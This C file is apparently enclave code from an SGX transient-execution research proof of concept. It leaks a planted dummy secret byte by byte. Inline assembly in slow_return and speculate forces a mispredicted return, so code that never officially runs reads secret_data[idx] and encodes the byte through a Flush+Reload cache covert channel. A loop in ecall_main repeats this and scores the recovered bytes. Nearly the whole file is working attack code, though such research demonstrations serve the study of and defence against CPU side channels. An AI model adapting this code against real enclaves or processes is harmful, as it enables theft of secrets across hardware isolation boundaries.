#include <stdarg.h>
#include <stdio.h>      /* vsnprintf */
#include <string.h>
#include <stdlib.h>
#include <stdarg.h>

#include "Enclave.h"
#include "Enclave_t.h"  /* print_string */

#include "libcache/cacheutils.h"

#define enclave_printf       printf

//#define DEBUG_PRINT
//#define TESTING
#define DATA "__________________"
#define SECRET "INACCESSIBLESECRET"

int idx;
char* secret_data;

int printf(const char *fmt, ...)
{
    char buf[BUFSIZ] = {'\0'};
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(buf, BUFSIZ, fmt, ap);
    va_end(ap);
    ocall_print_string(buf);
    return 0;
}

char * create_secret() {
    // allocate secret
    char* secret = (char*)malloc(sizeof(char) * 128);

    if(secret == NULL) {
        enclave_printf("allocation of secret failed\n");
    }
    memcpy(secret, SECRET, sizeof(SECRET));

    return secret;
}

char * create_public() {
    char* public_data = (char*)malloc(sizeof(DATA)+1);

    if(public_data == NULL) {
        enclave_printf("allocation of public failed\n");
    }

    memcpy(public_data, DATA, sizeof(DATA));

    return public_data;
}


#ifdef TESTING

char leaked[sizeof(SECRET)];

uint64_t not_ocall_init_attack(){
    pagesize = 4096;
    if(!CACHE_MISS)
        CACHE_MISS = detect_flush_reload_threshold();

#ifdef DEBUG_PRINT
    enclave_printf("[\x1b[33m*\x1b[0m] Flush+Reload Threshold: \x1b[33m%zd\x1b[0m\n", CACHE_MISS);
#endif

    char *_mem = (char*)malloc(pagesize * (256 + 4));
    mem = (char *)(((size_t)_mem & ~(pagesize-1)) + pagesize * 2);
    memset(mem, 0, pagesize * 256);

    memset(leaked, ' ', sizeof(leaked));
    leaked[sizeof(SECRET) - 1] = 0;

    flush_shared_memory();

    return (uint64_t)mem;
}

void not_ocall_encode(char c){
    cache_encode(c);
}

int not_ocall_cache_decode(int index){
    cache_decode_pretty(leaked, index);
    if (leaked[index] == SECRET[index]){
#ifdef DEBUG_PRINT
        enclave_printf("[%d] leaked: %c\t(%d)\n", index, leaked[index], c);
#endif
        leaked[index] = ' ';
        return 1;
    }

    leaked[index] = ' ';
    return 0;
}

#endif

__attribute__((naked)) void slow_return(void* target){
  asm volatile (
    "1:\n\t"
    "pop %%rax\n\t"
    "cmp %[target], (%%rsp)\n\t"
    "jne 1b\n\t"
    "mov %[target], (%%rsp)"
    :
    : [target] "r" (target)
    : "rax", "memory"
  );

  asm volatile (
    "mov $2147476866, %%rcx\n\t"
    "mov $1792388078, %%rax\n\t"
    "mov $1983325987, %%rdx\n\t"
    "div %%ecx\n\t"
    "div %%ecx\n\t"
    "div %%ecx\n\t"
    "div %%ecx\n\t"
    "div %%ecx\n\t"
    "div %%ecx\n\t"
    "sub $512, %%rdx\n\t"
    "add %%rdx, (%%rsp)\n\t"
    "ret\n\t"
    :
    :
    : "rax", "rcx", "rdx", "memory"
  );

  return;
}

__attribute__((naked)) void speculate(){
  register void* arg asm("rdi");  // bind C variable to rdi

    asm volatile (
        ".intel_syntax noprefix\n\t"
        "mov %0, [rsp]\n\t"
        ".att_syntax\n\t"
        : "=r" (arg)
    );

  // Will return directly in callee of speculate
  slow_return(arg);
   
  // --- dead code ---
  // access and cache encode here
  char c = secret_data[idx];
#ifdef TESTING
    not_ocall_encode(c);
#else
    ocall_encode(c);
#endif

  //printf("Dead code, should not be printed!\n");

  asm volatile ("ret\n\t":::);
}

int __attribute__ ((noinline)) call_start() {
  // slow_return will return directly here
  speculate();
  return 1;
}

void ecall_main(){
#ifdef TESTING
    uint64_t val = not_ocall_init_attack();
#else
    uint64_t val;    
    ocall_init_attack(&val);
#endif
    mem = (char*)val;

    secret_data = create_secret(); 

#ifdef DEBUG_PRINT
    enclave_printf("Public %p, Secret %p\n", public_data, secret_data);
#endif

    flush_shared_memory();
    mfence();

    idx = 0;  
    int c = 0;
    int score = 0;
#ifdef TESTING
    #define MAXITER 100
#else
    #define MAXITER 1000
#endif

    while (1 && c != MAXITER) {
        c++;
        call_start();
        
        mfence();

        // Recover data from covert channel
        int res = 0;
#ifdef TESTING
        res = not_ocall_cache_decode(idx);
#else
        ocall_cache_decode(&res, idx);
#endif
        if (res){
            score++;
        }

        idx = (idx + 1) % (sizeof(SECRET) - 1);
    }

    enclave_printf("%d, %d", c, score);
    if (score > 0){
        enclave_printf(" <--\n");
    }else{
        enclave_printf("\n");
    }
}



